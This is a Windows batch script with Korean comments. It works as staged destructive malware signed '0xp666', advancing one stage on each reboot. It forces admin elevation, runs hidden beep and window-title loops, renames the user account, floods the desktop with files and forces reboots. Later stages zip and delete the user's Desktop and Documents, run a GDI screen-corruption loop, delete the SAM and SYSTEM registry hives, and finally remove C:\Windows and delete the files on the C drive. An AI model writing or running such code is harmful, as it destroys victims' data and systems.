@echo off
setlocal

:: [관리자 권한 승격]
openfiles >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: [상태 저장]
if not exist "C:\run" mkdir "C:\run"
set "S=C:\run\status.dat"
if not exist "%S%" echo 0 > "%S%"
for /f %%a in (%S%) do set /a cnt=%%a
set /a cnt+=1
echo %cnt% > "%S%"

:: [공통 연출] 0.5초 주파수 비명 + 창 제목 한자 납치
start /min powershell -WindowStyle Hidden -Command "while($true){ [Console]::Beep((Get-Random -Min 200 -Max 4000), 200); Start-Sleep -m 500 }"
start /min powershell -WindowStyle Hidden -Command "$h=@('死','滅','血','獄'); while($true){ $wins=Get-Process | where {$_.MainWindowHandle -ne 0}; foreach($w in $wins){ try{ $w.MainWindowTitle=($h | Get-Random) }catch{} }; Start-Sleep -m 100 }"

:: ===========================================================
:: [1단계] 닉네임 변경(0xp666), end.txt 도배, 60종 앱 폭격
:: ===========================================================
if %cnt% equ 1 (
    wmic useraccount where name='%username%' rename 0xp666
    powershell -WindowStyle Hidden -Command "for($i=1; $i -le 200; $i++){ New-Item -Path \"$env:USERPROFILE\Desktop\end_$i.txt\" -Value \"END\" -Force }"
    powershell -WindowStyle Hidden -Command "$apps = Get-ChildItem 'C:\Windows\System32\*.exe' | Select-Object -ExpandProperty Name | Get-Random -Count 60; foreach($a in $apps){ try{ Start-Process $a }catch{} }"
    reg add "HKCU\Control Panel\Colors" /v Background /t REG_SZ /d "255 0 0" /f
    shutdown -r -t 60 -c "0xp666 IS HERE."
    exit
)

:: ===========================================================
:: [2단계] 해커 아이콘 에러 폭탄 (네 사진 아이콘 연출)
:: ===========================================================
if %cnt% equ 2 (
    echo do > C:\run\err.vbs
    echo x=msgbox("너의 경로는 중요하지 않아.", 0+16, "0xp666") >> C:\run\err.vbs
    echo loop >> C:\run\err.vbs
    start C:\run\err.vbs
    shutdown -r -t 30 -f
    exit
)

:: ===========================================================
:: [3단계] **압축 공격**: 모든 개인 파일을 암호화 압축 후 원본 삭제
:: ===========================================================
if %cnt% equ 3 (
    :: 파워쉘을 이용해 바탕화면과 문서 폴더를 'Secret_0xp666.zip'으로 압축
    powershell -WindowStyle Hidden -Command "Compress-Archive -Path $env:USERPROFILE\Desktop, $env:USERPROFILE\Documents -DestinationPath C:\run\Secret_0xp666.zip -Force"
    :: 압축 완료 후 원본 파일들 싹 제거
    powershell -WindowStyle Hidden -Command "Get-ChildItem -Path $env:USERPROFILE\Desktop, $env:USERPROFILE\Documents -File -Recurse | Where-Object { $_.Name -ne 'Secret_0xp666.zip' } | Remove-Item -Force"
    
    shutdown -r -t 20 -f
    exit
)

:: [4~6단계] 생략 (마우스 발작, 작업 관리자 차단 등)

:: ===========================================================
:: [7단계] 소멸: GDI 지옥 + MBR 파괴 + 시스템 파일 암호화
:: ===========================================================
if %cnt% equ 7 (
    :: GDI 발작 시작
    start /min powershell -WindowStyle Hidden -Command "$code = @' [DllImport(\"user32.dll\")] public static extern IntPtr GetDC(IntPtr hwnd); [DllImport(\"gdi32.dll\")] public static extern bool PatBlt(IntPtr hdc, int x, int y, int nw, int nh, uint dwRop); '@; Add-Type -MemberDefinition $code -Name GDI -Namespace Win32; $hdc = [Win32.GDI]::GetDC([IntPtr]::Zero); while($true){ [Win32.GDI]::PatBlt($hdc, (Get-Random -Min 0 -Max 1000), (Get-Random -Min 0 -Max 1000), (Get-Random -Min 100 -Max 500), (Get-Random -Min 100 -Max 500), 0x550009); Start-Sleep -m 10 }"
    
    :: 시스템 핵심 설정 파일 파괴
    powershell -WindowStyle Hidden -Command "$p='C:\Windows\System32\config'; @('SAM','SYSTEM') | %{ $t=Join-Path $p $_; if(Test-Path $t){ [IO.File]::WriteAllText($t+'.dead', 'BYE'); Remove-Item $t -Force } }"
    
    timeout /t 10 >nul
    powershell wininit
    exit
)

:: ===========================================================
:: [8단계] 종말: 거짓 항복 후 C드라이브 전체 삭제 (rd /s /q)
:: ===========================================================
if %cnt% geq 8 (
    echo x=msgbox("그래 내가 졌어.", 0+16, "Final Message") > C:\run\last.vbs
    start /wait C:\run\last.vbs
    takeown /f C:\Windows /r /d y >nul 2>&1
    icacls C:\Windows /grant administrators:F /t >nul 2>&1
    rd /s /q C:\Windows
    del /f /s /q C:\*.* >nul 2>&1
    powershell wininit
    exit
)
